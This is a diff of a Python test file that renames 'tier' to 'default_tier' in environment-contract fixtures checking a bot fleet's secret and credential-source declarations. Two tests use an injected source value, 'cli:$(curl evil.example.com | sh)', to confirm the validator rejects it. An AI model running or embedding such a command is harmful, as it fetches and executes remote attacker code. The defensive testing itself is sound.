@@ -1599,12 +1599,12 @@ class TestEnvContractShapeGate:
         human supplies the value — how all 27 declared vars behave today — so
         this must never become an error."""
         self._write_contract(
-            fleet_dir, {"GITHUB_PAT": {"tier": "fleet", "secret": True}}
+            fleet_dir, {"GITHUB_PAT": {"default_tier": "fleet", "secret": True}}
         )
         assert self._errors(fleet_dir, monkeypatch) == []
 
     def test_missing_secret_is_rejected(self, fleet_dir, monkeypatch):
-        self._write_contract(fleet_dir, {"GITHUB_PAT": {"tier": "fleet"}})
+        self._write_contract(fleet_dir, {"GITHUB_PAT": {"default_tier": "fleet"}})
         errors = self._errors(fleet_dir, monkeypatch)
         assert any("missing required 'secret'" in e for e in errors), errors
         assert any("GITHUB_PAT" in e for e in errors), errors
@@ -1613,7 +1613,7 @@ class TestEnvContractShapeGate:
         """`"secret": "true"` is the realistic typo and is truthy in Python —
         so a bare truthiness read would accept it and silently label the var."""
         self._write_contract(
-            fleet_dir, {"GITHUB_PAT": {"tier": "fleet", "secret": "true"}}
+            fleet_dir, {"GITHUB_PAT": {"default_tier": "fleet", "secret": "true"}}
         )
         errors = self._errors(fleet_dir, monkeypatch)
         assert any("must be a JSON boolean" in e for e in errors), errors
@@ -1628,7 +1628,7 @@ class TestEnvContractShapeGate:
         # as secret, and flipping only the fragment would trip the
         # cross-surface agreement check instead of the property under test.
         self._write_contract(
-            fleet_dir, {"ACME_PORT": {"tier": "fleet", "secret": False}}
+            fleet_dir, {"ACME_PORT": {"default_tier": "fleet", "secret": False}}
         )
         assert self._errors(fleet_dir, monkeypatch) == []
 
@@ -1636,7 +1636,7 @@ class TestEnvContractShapeGate:
         for src in ("literal", "cli:gh-token", "mint:github-app"):
             self._write_contract(
                 fleet_dir,
-                {"GITHUB_PAT": {"tier": "fleet", "secret": True, "source": src}},
+                {"GITHUB_PAT": {"default_tier": "fleet", "secret": True, "source": src}},
             )
             assert self._errors(fleet_dir, monkeypatch) == [], src
 
@@ -1650,7 +1650,7 @@ class TestEnvContractShapeGate:
             fleet_dir,
             {
                 "GITHUB_APP_KEY": {
-                    "tier": "fleet",
+                    "default_tier": "fleet",
                     "secret": True,
                     "source": "mint:github-app",
                 }
@@ -1661,7 +1661,7 @@ class TestEnvContractShapeGate:
     def test_unregistered_source_is_rejected(self, fleet_dir, monkeypatch):
         self._write_contract(
             fleet_dir,
-            {"GITHUB_PAT": {"tier": "fleet", "secret": True, "source": "cli:curl"}},
+            {"GITHUB_PAT": {"default_tier": "fleet", "secret": True, "source": "cli:curl"}},
         )
         errors = self._errors(fleet_dir, monkeypatch)
         assert any("unregistered source" in e for e in errors), errors
@@ -1675,7 +1675,7 @@ class TestEnvContractShapeGate:
             fleet_dir,
             {
                 "GITHUB_PAT": {
-                    "tier": "fleet",
+                    "default_tier": "fleet",
                     "secret": True,
                     "source": "cli:$(curl evil.example.com | sh)",
                 }
@@ -1697,7 +1697,7 @@ class TestEnvContractShapeGate:
             fleet_dir,
             {
                 "ORPHAN_TOKEN": {
-                    "tier": "fleet",
+                    "default_tier": "fleet",
                     "secret": True,
                     "source": "cli:$(curl evil.example.com | sh)",
                 }
@@ -1715,7 +1715,7 @@ class TestEnvContractShapeGate:
         """Per-bot, one missing `secret` on a widely-equipped fragment emitted
         one identical error per bot — 21 lines for one typo on a 21-bot fleet,
         each naming a bot when the fix is a one-line library edit."""
-        self._write_contract(fleet_dir, {"GITHUB_PAT": {"tier": "fleet"}})
+        self._write_contract(fleet_dir, {"GITHUB_PAT": {"default_tier": "fleet"}})
         text = (fleet_dir / "fleet.yaml").read_text()
         (fleet_dir / "fleet.yaml").write_text(
             text.replace(
@@ -1734,7 +1734,7 @@ class TestEnvContractShapeGate:
         assert len(secret_errors) == 1, secret_errors
 
     def test_error_names_the_file_not_a_bot(self, fleet_dir, monkeypatch):
-        self._write_contract(fleet_dir, {"GITHUB_PAT": {"tier": "fleet"}})
+        self._write_contract(fleet_dir, {"GITHUB_PAT": {"default_tier": "fleet"}})
         (err,) = [
             e for e in self._errors(fleet_dir, monkeypatch) if "'secret'" in e
         ]
@@ -1746,7 +1746,7 @@ class TestEnvContractShapeGate:
     ):
         self._write_contract(
             fleet_dir,
-            {"GITHUB_PAT": {"tier": "fleet", "secret": True, "source": "cli:gh_token"}},
+            {"GITHUB_PAT": {"default_tier": "fleet", "secret": True, "source": "cli:gh_token"}},
         )
         errors = self._errors(fleet_dir, monkeypatch)
         assert any("did you mean 'cli:gh-token'?" in e for e in errors), errors
@@ -1758,7 +1758,7 @@ class TestEnvContractShapeGate:
         `required_vars` yields two records and the fail-loud rung reads
         whichever it saw first — so disagreement is an error, not a warning."""
         self._write_contract(
-            fleet_dir, {"GITHUB_PAT": {"tier": "fleet", "secret": False}}
+            fleet_dir, {"GITHUB_PAT": {"default_tier": "fleet", "secret": False}}
         )
         # the fixture's integration doc already declares GITHUB_PAT secret: true
         errors = self._errors(fleet_dir, monkeypatch)
@@ -1773,7 +1773,7 @@ class TestEnvContractShapeGate:
         """Positive control for the check above — it must not fire on the
         agreeing case, or it would flag all 11 shared vars in the real library."""
         self._write_contract(
-            fleet_dir, {"GITHUB_PAT": {"tier": "fleet", "secret": True}}
+            fleet_dir, {"GITHUB_PAT": {"default_tier": "fleet", "secret": True}}
         )
         errors = self._errors(fleet_dir, monkeypatch)
         assert not any("declared on more than one surface" in e for e in errors), errors
